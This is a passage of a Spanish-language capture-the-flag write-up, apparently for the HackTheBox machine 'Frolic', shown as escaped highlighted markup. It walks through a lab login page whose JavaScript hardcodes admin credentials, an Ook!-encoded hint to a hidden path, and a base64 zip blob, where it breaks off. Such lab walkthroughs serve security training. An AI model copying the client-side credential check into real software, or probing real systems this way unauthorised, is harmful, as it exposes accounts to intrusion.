&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Crack me :|&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;c&#34;&gt;&amp;lt;!-- Include CSS File Here --&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;link&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;css/style.css&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&#34;c&#34;&gt;&amp;lt;!-- Include JS File Here --&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;js/login.js&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;container&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;main&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;h2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;c&amp;#39;mon i m hackable&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;h2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;form_id&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;post&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;myform&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;label&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;User Name :&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;label&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;label&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Password :&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;label&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;button&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Login&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;onclick&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;validate()&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;span&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;note&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Note : Nothing&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;span&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Y dentro de login.js encontramos una condicional que contiene un usuario y contraseña, tambien una redireccion hacia success.html:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;usuario: admin
contraseña: superduperlooperpassword_lol
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;attempt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// Variable to count number of attempts.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// Below function Executes on click of login button.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;validate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;superduperlooperpassword_lol&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Login successfully&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;success.html&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// Redirecting to other page.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;attempt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// Decrementing by one.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;You have left &amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;attempt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34; attempt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;// Disabling fields after 3 attempts.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;attempt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;disabled&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;disabled&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;disabled&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Dentro de success.html encontramos caracteres extraños:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/frolic/Screenshot%20from%202019-03-22%2018-13-25.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizando la pagina &lt;a href=&#34;https://www.dcode.fr/ook-language&#34;&gt;https://www.dcode.fr/ook-language&lt;/a&gt; para decodificar lo anterior:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/frolic/Screenshot%20from%202019-03-22%2018-16-13.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos muestra el mensaje: &amp;lsquo;Nothing here check /asdiSIAJJ0QWE9JAS&amp;rsquo; por lo que podria ser una ruta dentro de la pagina al visitar dicha ruta nos encontramos con lo siguiente:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;nx&#34;&gt;UEsDBBQACQAIAMOJN00j&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;K1i6f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;BQyOES4baHpOrQu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;J4XxPATolb&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;EMrX4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;T7al&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;fi&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/kY6ZTAJ3h/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;uoTj&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;lurp78cmcTJviFfUnOM5UEsHCCP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;lsUsAAAAGkC&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
